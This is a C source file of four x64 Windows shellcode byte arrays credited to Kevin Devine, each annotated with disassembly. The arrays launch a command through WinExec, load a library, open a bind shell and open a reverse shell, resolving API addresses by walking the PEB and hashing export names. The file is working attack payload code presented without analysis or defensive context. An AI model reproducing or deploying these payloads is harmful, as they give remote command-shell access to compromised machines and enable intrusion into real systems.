
/* Copyright (c) 2014 Kevin Devine */
/* Size = 105 bytes */

char exec64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x5A"                      /*  jmp 00000064h                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x7E\x30"              /*  mov rdi, qword ptr [rsi+30h]       */
  /* 0022 */  "\x03\x4F\x3C"                  /*  add ecx, dword ptr [rdi+3Ch]       */
  /* 0025 */  "\x8B\x5C\x39\x28"              /*  mov ebx, dword ptr [rcx+rdi+28h]   */
  /* 0029 */  "\x8B\x74\x3B\x20"              /*  mov esi, dword ptr [rbx+rdi+20h]   */
  /* 002D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0030 */  "\x8B\x4C\x3B\x24"              /*  mov ecx, dword ptr [rbx+rdi+24h]   */
  /* 0034 */  "\x48\x03\xCF"                  /*  add rcx, rdi                       */
  /* 0037 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0039 */  "\x0F\xB7\x2C\x51"              /*  movzx ebp, word ptr [rcx+rdx*2]    */
  /* 003D */  "\xFF\xC2"                      /*  inc edx                            */
  /* 003F */  "\xAD"                          /*  lodsd                              */
  /* 0040 */  "\x81\x3C\x38\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rdi], 456E6957h */
  /* 0047 */  "\x75\xF0"                      /*  jne 00000039h                      */
  /* 0049 */  "\x8B\x74\x3B\x1C"              /*  mov esi, dword ptr [rbx+rdi+1Ch]   */
  /* 004D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0050 */  "\x8B\x04\xAE"                  /*  mov eax, dword ptr [rsi+rbp*4]     */
  /* 0053 */  "\x48\x03\xC7"                  /*  add rax, rdi                       */
  /* 0056 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0058 */  "\x59"                          /*  pop rcx                            */
  /* 0059 */  "\xFF\xD0"                      /*  call rax                           */
  /* 005B */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 005F */  "\x5D"                          /*  pop rbp                            */
  /* 0060 */  "\x5F"                          /*  pop rdi                            */
  /* 0061 */  "\x5E"                          /*  pop rsi                            */
  /* 0062 */  "\x5B"                          /*  pop rbx                            */
  /* 0063 */  "\xC3"                          /*  ret                                */
  /* 0064 */  "\xE8\xA1\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 110 bytes */

char load64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x5F"                      /*  jmp 00000069h                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x7E\x30"              /*  mov rdi, qword ptr [rsi+30h]       */
  /* 0022 */  "\x03\x4F\x3C"                  /*  add ecx, dword ptr [rdi+3Ch]       */
  /* 0025 */  "\x8B\x5C\x39\x28"              /*  mov ebx, dword ptr [rcx+rdi+28h]   */
  /* 0029 */  "\x8B\x74\x3B\x20"              /*  mov esi, dword ptr [rbx+rdi+20h]   */
  /* 002D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0030 */  "\x8B\x4C\x3B\x24"              /*  mov ecx, dword ptr [rbx+rdi+24h]   */
  /* 0034 */  "\x48\x03\xCF"                  /*  add rcx, rdi                       */
  /* 0037 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0039 */  "\x0F\xB7\x2C\x51"              /*  movzx ebp, word ptr [rcx+rdx*2]    */
  /* 003D */  "\xFF\xC2"                      /*  inc edx                            */
  /* 003F */  "\xAD"                          /*  lodsd                              */
  /* 0040 */  "\x81\x3C\x38\x4C\x6F\x61\x64"  /*  cmp dword ptr [rax+rdi], 64616F4Ch */
  /* 0047 */  "\x75\xF0"                      /*  jne 00000039h                      */
  /* 0049 */  "\x80\x7C\x38\x0B\x41"          /*  cmp byte ptr [rax+rdi+0Bh], 41h    */
  /* 004E */  "\x75\xE9"                      /*  jne 00000039h                      */
  /* 0050 */  "\x8B\x74\x3B\x1C"              /*  mov esi, dword ptr [rbx+rdi+1Ch]   */
  /* 0054 */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0057 */  "\x8B\x04\xAE"                  /*  mov eax, dword ptr [rsi+rbp*4]     */
  /* 005A */  "\x48\x03\xC7"                  /*  add rax, rdi                       */
  /* 005D */  "\x59"                          /*  pop rcx                            */
  /* 005E */  "\xFF\xD0"                      /*  call rax                           */
  /* 0060 */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 0064 */  "\x5D"                          /*  pop rbp                            */
  /* 0065 */  "\x5F"                          /*  pop rdi                            */
  /* 0066 */  "\x5E"                          /*  pop rsi                            */
  /* 0067 */  "\x5B"                          /*  pop rbx                            */
  /* 0068 */  "\xC3"                          /*  ret                                */
  /* 0069 */  "\xE8\x9C\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 388 bytes */

#define BIND_OVERLAP64_DATA_OFFSET 0xDC

char bind_overlap64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                                 */
  /* 0001 */  "\x56"                          /*  push rsi                                 */
  /* 0002 */  "\x57"                          /*  push rdi                                 */
  /* 0003 */  "\x55"                          /*  push rbp                                 */
  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
  /* 000A */  "\x41\x57"                      /*  push r15                                 */
  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
  /* 0013 */  "\x48\x83\xEC\x78"              /*  sub rsp, 78h                             */
  /* 0017 */  "\xF9"                          /*  stc                                      */
  /* 0018 */  "\xEB\x71"                      /*  jmp 0000008Bh                            */
  /* 001A */  "\x5E"                          /*  pop rsi                                  */
  /* 001B */  "\x48\x8D\x6E\x30"              /*  lea rbp, qword ptr [rsi+30h]             */
  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0021 */  "\x99"                          /*  cdq                                      */
  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
  /* 0024 */  "\x48\x2B\xE2"                  /*  sub rsp, rdx                             */
  /* 0027 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
  /* 0029 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
  /* 002C */  "\xF3\xAA"                      /*  rep stosb                                */
  /* 002E */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
  /* 0033 */  "\xF7\xD0"                      /*  not eax                                  */
  /* 0035 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
  /* 003A */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
  /* 003D */  "\x48\xAB"                      /*  stosq                                    */
  /* 003F */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
  /* 0042 */  "\x48\xAD"                      /*  lodsq                                    */
  /* 0044 */  "\x48\xF7\xD0"                  /*  not rax                                  */
  /* 0047 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0049 */  "\x48\xAF"                      /*  scasq                                    */
  /* 004B */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
  /* 004E */  "\x6A\x68"                      /*  push 00000068h                           */
  /* 0050 */  "\x58"                          /*  pop rax                                  */
  /* 0051 */  "\xAB"                          /*  stosd                                    */
  /* 0052 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
  /* 0056 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
  /* 005B */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
  /* 005F */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0062 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0065 */  "\xB2\x01"                      /*  mov dl, 01h                              */
  /* 0067 */  "\xB1\x02"                      /*  mov cl, 02h                              */
  /* 0069 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 006B */  "\x93"                          /*  xchg eax, ebx                            */
  /* 006C */  "\x6A\x10"                      /*  push 00000010h                           */
  /* 006E */  "\x41\x58"                      /*  pop r8                                   */
  /* 0070 */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
  /* 0073 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0075 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0077 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 007A */  "\x92"                          /*  xchg eax, edx                            */
  /* 007B */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 007D */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 007F */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0082 */  "\x92"                          /*  xchg eax, edx                            */
  /* 0083 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0085 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0087 */  "\x4C\x8B\xF0"                  /*  mov r14, rax                             */
  /* 008A */  "\xF8"                          /*  clc                                      */
  /* 008B */  "\x72\x4A"                      /*  jc 000000D7h                             */
  /* 008D */  "\x48\xAB"                      /*  stosq                                    */
  /* 008F */  "\x48\xAB"                      /*  stosq                                    */
  /* 0091 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0093 */  "\x48\xAF"                      /*  scasq                                    */
  /* 0095 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
  /* 009A */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
  /* 009E */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 00A1 */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 00A4 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
  /* 00A7 */  "\x33\xC9"                      /*  xor ecx, ecx                             */
  /* 00A9 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AB */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
  /* 00AE */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B1 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B3 */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B6 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B8 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
  /* 00BC */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00BE */  "\x49\x8B\xCE"                  /*  mov rcx, r14                             */
  /* 00C1 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C3 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 00C5 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C7 */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
  /* 00CA */  "\x41\x5F"                      /*  pop r15                                  */
  /* 00CC */  "\x41\x5E"                      /*  pop r14                                  */
  /* 00CE */  "\x41\x5D"                      /*  pop r13                                  */
  /* 00D0 */  "\x41\x5C"                      /*  pop r12                                  */
  /* 00D2 */  "\x5D"                          /*  pop rbp                                  */
  /* 00D3 */  "\x5F"                          /*  pop rdi                                  */
  /* 00D4 */  "\x5E"                          /*  pop rsi                                  */
  /* 00D5 */  "\x5B"                          /*  pop rbx                                  */
  /* 00D6 */  "\xC3"                          /*  ret                                      */
  /* 00D7 */  "\xE8\x3E\xFF\xFF\xFF"          /*  call 0000001Ah                           */
  /* 00DC */  "\x00\x00\x00\x00"
  /* 00E0 */  "\x00\x00\x00\x00"
  /* 00E4 */  "\xB2\xA5\xC1\x87"
  /* 00E8 */  "\x1C\xB1\x14\xCB"
  /* 00EC */  "\xEE\xAD\xFD\x8A"
  /* 00F0 */  "\x3C\x2C\x96\x9A"
  /* 00F4 */  "\xFE\xDF\x72\x17"
  /* 00F8 */  "\x4B\xDA\x38\x53"
  /* 00FC */  "\x35\xC9\x1E\x7F"
  /* 0100 */  "\x35\xC9\x1E\x7F"
  /* 0104 */  "\x6E\xED\xCD\xA2"
  /* 0108 */  "\x6E\xED\xCD\xA2"
  /* 010C */  "\xAD"                          /*  lodsd                                    */
  /* 010D */  "\x50"                          /*  push rax                                 */
  /* 010E */  "\x51"                          /*  push rcx                                 */
  /* 010F */  "\x52"                          /*  push rdx                                 */
  /* 0110 */  "\x53"                          /*  push rbx                                 */
  /* 0111 */  "\x55"                          /*  push rbp                                 */
  /* 0112 */  "\x56"                          /*  push rsi                                 */
  /* 0113 */  "\x57"                          /*  push rdi                                 */
  /* 0114 */  "\x6A\x60"                      /*  push 00000060h                           */
  /* 0116 */  "\x5E"                          /*  pop rsi                                  */
  /* 0117 */  "\x65\x48\xAD"                  /*  lodsq                                    */
  /* 011A */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
  /* 011E */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
  /* 0122 */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
  /* 0126 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
  /* 0129 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
  /* 012C */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
  /* 012F */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
  /* 0133 */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
  /* 0138 */  "\xAD"                          /*  lodsd                                    */
  /* 0139 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 013A */  "\x67\xE3\xE5"                  /*  jecxz 00000122h                          */
  /* 013D */  "\xAD"                          /*  lodsd                                    */
  /* 013E */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
  /* 0142 */  "\xAD"                          /*  lodsd                                    */
  /* 0143 */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
  /* 0147 */  "\xAD"                          /*  lodsd                                    */
  /* 0148 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
  /* 014C */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
  /* 0150 */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
  /* 0153 */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0155 */  "\x99"                          /*  cdq                                      */
  /* 0156 */  "\xAC"                          /*  lodsb                                    */
  /* 0157 */  "\x03\xD0"                      /*  add edx, eax                             */
  /* 0159 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
  /* 015C */  "\x33\xD0"                      /*  xor edx, eax                             */
  /* 015E */  "\xFF\xC8"                      /*  dec eax                                  */
  /* 0160 */  "\x79\xF4"                      /*  jns 00000156h                            */
  /* 0162 */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
  /* 0167 */  "\xE0\xE3"                      /*  loopne 0000014Ch                         */
  /* 0169 */  "\x75\xB7"                      /*  jne 00000122h                            */
  /* 016B */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
  /* 016F */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
  /* 0173 */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
  /* 0176 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
  /* 017B */  "\x5F"                          /*  pop rdi                                  */
  /* 017C */  "\x5E"                          /*  pop rsi                                  */
  /* 017D */  "\x5D"                          /*  pop rbp                                  */
  /* 017E */  "\x5B"                          /*  pop rbx                                  */
  /* 017F */  "\x5A"                          /*  pop rdx                                  */
  /* 0180 */  "\x59"                          /*  pop rcx                                  */
  /* 0181 */  "\x58"                          /*  pop rax                                  */
  /* 0182 */  "\xFF\xE0"                      /*  jmp rax                                  */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 351 bytes */

#define REV_OVERLAP64_DATA_OFFSET 0xC3

char rev_overlap64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                                 */
  /* 0001 */  "\x56"                          /*  push rsi                                 */
  /* 0002 */  "\x57"                          /*  push rdi                                 */
  /* 0003 */  "\x55"                          /*  push rbp                                 */
  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
  /* 000A */  "\x41\x57"                      /*  push r15                                 */
  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
  /* 0013 */  "\x48\x83\xEC\x78"              /*  sub rsp, 78h                             */
  /* 0017 */  "\xF9"                          /*  stc                                      */
  /* 0018 */  "\xEB\x6F"                      /*  jmp 00000089h                            */
  /* 001A */  "\x5E"                          /*  pop rsi                                  */
  /* 001B */  "\x48\x8D\x6E\x24"              /*  lea rbp, qword ptr [rsi+24h]             */
  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0021 */  "\x99"                          /*  cdq                                      */
  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
  /* 0024 */  "\x48\x2B\xE2"                  /*  sub rsp, rdx                             */
  /* 0027 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
  /* 0029 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
  /* 002C */  "\xF3\xAA"                      /*  rep stosb                                */
  /* 002E */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
  /* 0033 */  "\xF7\xD0"                      /*  not eax                                  */
  /* 0035 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
  /* 003A */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
  /* 003D */  "\x48\xAB"                      /*  stosq                                    */
  /* 003F */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
  /* 0042 */  "\x48\xAD"                      /*  lodsq                                    */
  /* 0044 */  "\x48\xF7\xD0"                  /*  not rax                                  */
  /* 0047 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0049 */  "\x48\xAF"                      /*  scasq                                    */
  /* 004B */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
  /* 004E */  "\x6A\x68"                      /*  push 00000068h                           */
  /* 0050 */  "\x58"                          /*  pop rax                                  */
  /* 0051 */  "\xAB"                          /*  stosd                                    */
  /* 0052 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
  /* 0056 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
  /* 005B */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
  /* 005F */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0062 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0065 */  "\xB2\x01"                      /*  mov dl, 01h                              */
  /* 0067 */  "\xB1\x02"                      /*  mov cl, 02h                              */
  /* 0069 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 006B */  "\x48\xAB"                      /*  stosq                                    */
  /* 006D */  "\x48\xAB"                      /*  stosq                                    */
  /* 006F */  "\x48\xAB"                      /*  stosq                                    */
  /* 0071 */  "\x48\xAF"                      /*  scasq                                    */
  /* 0073 */  "\x93"                          /*  xchg eax, ebx                            */
  /* 0074 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
  /* 0079 */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
  /* 007D */  "\x6A\x10"                      /*  push 00000010h                           */
  /* 007F */  "\x41\x58"                      /*  pop r8                                   */
  /* 0081 */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
  /* 0084 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0086 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0088 */  "\xF8"                          /*  clc                                      */
  /* 0089 */  "\x72\x33"                      /*  jc 000000BEh                             */
  /* 008B */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 008E */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0091 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
  /* 0094 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 0095 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0097 */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
  /* 009A */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 009D */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 009F */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00A2 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00A4 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
  /* 00A8 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AA */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 00AC */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AE */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
  /* 00B1 */  "\x41\x5F"                      /*  pop r15                                  */
  /* 00B3 */  "\x41\x5E"                      /*  pop r14                                  */
  /* 00B5 */  "\x41\x5D"                      /*  pop r13                                  */
  /* 00B7 */  "\x41\x5C"                      /*  pop r12                                  */
  /* 00B9 */  "\x5D"                          /*  pop rbp                                  */
  /* 00BA */  "\x5F"                          /*  pop rdi                                  */
  /* 00BB */  "\x5E"                          /*  pop rsi                                  */
  /* 00BC */  "\x5B"                          /*  pop rbx                                  */
  /* 00BD */  "\xC3"                          /*  ret                                      */
  /* 00BE */  "\xE8\x57\xFF\xFF\xFF"          /*  call 0000001Ah                           */
  /* 00C3 */  "\x00\x00\x00\x00"
  /* 00C7 */  "\x00\x00\x00\x00"
  /* 00CB */  "\xB2\xA5\xC1\x87"
  /* 00CF */  "\xEC\x80\x9C\xE4"
  /* 00D3 */  "\xFE\xDF\x72\x17"
  /* 00D7 */  "\x4B\xDA\x38\x53"
  /* 00DB */  "\x35\xC9\x1E\x7F"
  /* 00DF */  "\x35\xC9\x1E\x7F"
  /* 00E3 */  "\x6E\xED\xCD\xA2"
  /* 00E7 */  "\xAD"                          /*  lodsd                                    */
  /* 00E8 */  "\x50"                          /*  push rax                                 */
  /* 00E9 */  "\x51"                          /*  push rcx                                 */
  /* 00EA */  "\x52"                          /*  push rdx                                 */
  /* 00EB */  "\x53"                          /*  push rbx                                 */
  /* 00EC */  "\x55"                          /*  push rbp                                 */
  /* 00ED */  "\x56"                          /*  push rsi                                 */
  /* 00EE */  "\x57"                          /*  push rdi                                 */
  /* 00EF */  "\x6A\x60"                      /*  push 00000060h                           */
  /* 00F1 */  "\x5E"                          /*  pop rsi                                  */
  /* 00F2 */  "\x65\x48\xAD"                  /*  lodsq                                    */
  /* 00F5 */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
  /* 00F9 */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
  /* 00FD */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
  /* 0101 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
  /* 0104 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
  /* 0107 */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
  /* 010A */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
  /* 010E */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
  /* 0113 */  "\xAD"                          /*  lodsd                                    */
  /* 0114 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 0115 */  "\x67\xE3\xE5"                  /*  jecxz 000000FDh                          */
  /* 0118 */  "\xAD"                          /*  lodsd                                    */
  /* 0119 */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
  /* 011D */  "\xAD"                          /*  lodsd                                    */
  /* 011E */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
  /* 0122 */  "\xAD"                          /*  lodsd                                    */
  /* 0123 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
  /* 0127 */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
  /* 012B */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
  /* 012E */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0130 */  "\x99"                          /*  cdq                                      */
  /* 0131 */  "\xAC"                          /*  lodsb                                    */
  /* 0132 */  "\x03\xD0"                      /*  add edx, eax                             */
  /* 0134 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
  /* 0137 */  "\x33\xD0"                      /*  xor edx, eax                             */
  /* 0139 */  "\xFF\xC8"                      /*  dec eax                                  */
  /* 013B */  "\x79\xF4"                      /*  jns 00000131h                            */
  /* 013D */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
  /* 0142 */  "\xE0\xE3"                      /*  loopne 00000127h                         */
  /* 0144 */  "\x75\xB7"                      /*  jne 000000FDh                            */
  /* 0146 */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
  /* 014A */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
  /* 014E */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
  /* 0151 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
  /* 0156 */  "\x5F"                          /*  pop rdi                                  */
  /* 0157 */  "\x5E"                          /*  pop rsi                                  */
  /* 0158 */  "\x5D"                          /*  pop rbp                                  */
  /* 0159 */  "\x5B"                          /*  pop rbx                                  */
  /* 015A */  "\x5A"                          /*  pop rdx                                  */
  /* 015B */  "\x59"                          /*  pop rcx                                  */
  /* 015C */  "\x58"                          /*  pop rax                                  */
  /* 015D */  "\xFF\xE0"                      /*  jmp rax                                  */
};
